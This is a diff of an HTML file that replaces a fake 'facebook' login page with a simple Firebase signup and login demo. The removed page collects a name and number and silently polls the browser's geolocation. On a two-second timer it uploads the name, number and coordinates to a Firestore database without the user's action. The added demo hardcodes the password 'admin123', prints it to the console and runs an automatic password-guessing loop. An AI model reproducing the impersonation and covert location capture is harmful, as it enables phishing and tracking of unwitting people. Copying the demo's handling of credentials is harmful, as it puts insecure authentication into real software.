@@ -1,224 +1,178 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  
-  <title>H</title>
+  <title>Firebase Auth System</title>
   <style>
-body {
-   font-family: Arial, sans-serif;
-   background: #f0f2f5;
-   display: flex;
-   justify-content: center;
-   align-items: center;
-   height: 100vh;
-   }
-   
-   .container {
-   background: white;
-   padding: 20px;
-   width: 320px;
-   border-radius: 10px;
-   box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-   text-align: center;
-   overflow: hidden;
-   }
-   
-   .logo {
-   font-size: 40px;
-   font-weight: bold;
-   color: #1877f2;
-   margin-bottom: 20px;
-   }
-   
-   input {
-   width: %;
-   padding: 12px;
-   margin: 8px 0;
-   border: 1px solid #ccc;
-   border-radius: 6px;
-   }
-   
-   .login-btn {
-   width: 100%;
-   padding: 12px;
-   background: #1877f2;
-   color: white;
-   border: none;
-   border-radius: 6px;
-   font-size: 16px;
-   cursor: pointer;
-   }
-   
-   .login-btn:hover {
-   background: #145dbf;
-   }
-   
-   .link {
-   margin-top: 10px;
-   display: block;
-   font-size: 14px;
-   color: #1877f2;
-   text-decoration: none;
-   }
-   
-   .link:hover {
-   text-decoration: underline;
-   }
-   </style>
+   #past{
+     position: absolute;
+     top: 5%;
+   } 
+  </style>
 </head>
 <body>
-  <div class="container">
-  <div class="logo">facebook</div>  
+
+<h2>Login System 🔐</h2>
+
+<input id="email" type="email" placeholder="Email"><br><br>
+<input id="password" type="password" placeholder="Password"><br><br>
+
+<button onclick="signup()">Signup</button>
+<button onclick="login()">Login</button>
+<button onclick="logout()">Logout</button>
+<button onclick="runTests()">Auto Test</button>
+
+
+<h3 id="status">Not logged in</h3>
+<p id="msg"></p>
+<p id="past">asd</p>
+
+
+
+
+<!------------------->
+  <script>
+    const correctPassword = "admin123";
+    let attempts = 0;
+    const maxAttempts = 10;
     
-<input type="text" id="name" placeholder="Name"><br>
-<input type="text" id="number" placeholder="Number"><br><br>
+    function login() {
+      const input = document.getElementById("password").value;
+      const msg = document.getElementById("msg");
+      
+      if (attempts >= maxAttempts) {
+        msg.innerText = "🚫 Account locked!";
+        return;
+      }
+      
+      if (input === correctPassword) {
+    msg.innerText = "✅ Login successful! hhhh";
+    console.log('hey bro :',correctPassword)
+     
+        
+        attempts = 0;
+      } else {
+        attempts++;
+        msg.innerText = `❌ Wrong password | Attempts left: ${maxAttempts - attempts}`;
+        
+        if (attempts >= maxAttempts) {
+          msg.innerText = "🚫 Account locked due to too many attempts!";
+        }
+      }
+    }
+    
+    // 🔁 Auto test (safe demo only)
+    function runTests() {
+      const testPasswords = ["123", "test", "wrong", "admin123","123321","1234567","112233","009988","112233098","123321","cvc"];
+      let i = 0;
+      
+      function next() {
+        if (i >= testPasswords.length) return;
+        
+       var as =document.getElementById("password").value = testPasswords[i];
+        
+      console.log(as)  
+    document.getElementById("past").innerHTML=as;
+        login();
+      clearTimeout(next)  
+        
+        i++;
+        setTimeout(next, 1000);
+      }
+      
+      next();
+    }
+  </script>
 
-<textarea name="fname" id="latitude"></textarea>
-<textarea name="lname" id="logtude"></textarea>
 
 
-
-
-
-<button class="login-btn" id="sendBtn">LOGIN</button>
-  <a class="link" href="#">Forgotten password?</a>
-  <a class="link" href="#">Create new account</a>
-  
-</div>
-
-
-
-
-
-
+<!------------------->
 
 <script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.1/firebase-app.js";
-import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/12.12.1/firebase-firestore.js";
 
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
+import {
+  getAuth,
+  createUserWithEmailAndPassword,
+  signInWithEmailAndPassword,
+  signOut,
+  onAuthStateChanged
+} from "https://www.gstatic.com/firebasejs/12.14.0/firebase-auth.js";
+
+import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-analytics.js";
+
+// Firebase config
 const firebaseConfig = {
-  apiKey: "AIzaSyBL0TdZ-99-2z2TxJAcC8IarMe_CwgpB9Q",
-  authDomain: "enternu-8ea16.firebaseapp.com",
-  projectId: "enternu-8ea16",
-  storageBucket: "enternu-8ea16.firebasestorage.app",
-  messagingSenderId: "154759454207",
-  appId: "1:154759454207:web:51442b35d31da1a46b1bca",
-  measurementId: "G-QP1VHL75EM"
+  apiKey: "AIzaSyAUDC9wwxb1PaqLLsgrBCxejzGI2MO0IrI",
+  authDomain: "logi-app-b40b4.firebaseapp.com",
+  projectId: "logi-app-b40b4",
+  storageBucket: "logi-app-b40b4.firebasestorage.app",
+  messagingSenderId: "14326388492",
+  appId: "1:14326388492:web:1235ee58e09669c90e5b29",
+  measurementId: "G-HTY1SLTNXJ"
 };
 
+// Init Firebase
 const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+const auth = getAuth(app);
+const analytics = getAnalytics(app);
 
+// SIGNUP
+window.signup = function () {
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
 
-function send(){
-    let lat,long;  
-  
-  navigator.geolocation.getCurrentPosition((position)=>{
-      
- lat =position.coords.latitude;
- long=position.coords.longitude;
-      
- 
- document.getElementById('latitude').innerHTML = lat;
-
-document.getElementById('logtude').innerHTML = long;
-
-
-  });
-};
-  
-  setInterval(send,1)
-  
-
-
-/*
-
-window.onload = () => {
-
-  document.getElementById("sendBtn").onclick = async () => {
-    
-  
-//_________________
- const name = document.getElementById("name").value;
- const number = document.getElementById("number").value;
- 
-var abc =document.getElementById('latitude').value;
-var def=document.getElementById('logtude').value;
-
- try {
-   await addDoc(collection(db, "user"), { name, number,abc,def});
-   alert("Success");
- } catch (err) {
-   console.error(err);
-   alert("Error");
- }
-//_______
-
- 
-  
-  
-
-
-
-  };
+  createUserWithEmailAndPassword(auth, email, password)
+    .then((userCredential) => {
+      alert("Signup successful!");
+    })
+    /*.catch((error) => {
+      alert(error.message);
+      console.log(error.code);
+    });*/
 };
 
+// LOGIN
+window.login = function () {
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
 
-window.onload = () => {
-  window.addEventListener("touchstart", async () => {
-  const name = document.getElementById("name").value;
-const number = document.getElementById("number").value;
-
-var abc = document.getElementById('latitude').value;
-var def = document.getElementById('logtude').value;
-
-try {
-  await addDoc(collection(db, "user"), { name, number, abc, def });
-  alert("Success");
-} catch (err) {
-  console.error(err);
-  alert("Error");
-}
-  
-  
-  
-  });
+  signInWithEmailAndPassword(auth, email, password)
+    .then((userCredential) => {
+      alert("Login successful!");
+    })
+   /* .catch((error) => {
+      alert(error.message);
+     console.log(error.code);
+    });*/
 };
-*/
+
+// LOGOUT
+window.logout = function () {
+  signOut(auth);
+  
+  
+  
+};
+
+// AUTH STATE
+onAuthStateChanged(auth, (user) => {
+  const status = document.getElementById("status");
+
+  if (user) {
+    status.innerText = "Logged in: " + user.email;
+  } else {
+    status.innerText = "Not logged in";
+  }
+});
 
 
-async function startInterval() {
-  const name = document.getElementById("name").value;
- const number = document.getElementById("number").value;
- 
-var abc =document.getElementById('latitude').value;
-var def=document.getElementById('logtude').value;
-
- try {
-   await addDoc(collection(db, "user"), { name, number,abc,def});
-   //alert("Success");
- } catch (err) {
-   console.error(err);
-  // alert("Error");
- }
-//_______
-
-}
 
 
 
-//window.addEventListener("touchstart", async () => {
-//  await startInterval();
- // console.log('pass')});
-async function ti(){
-   await startInterval();
-   console.log('pass')
- }
- 
-setInterval(ti,2000);
+
+
+
+
 
 </script>
 
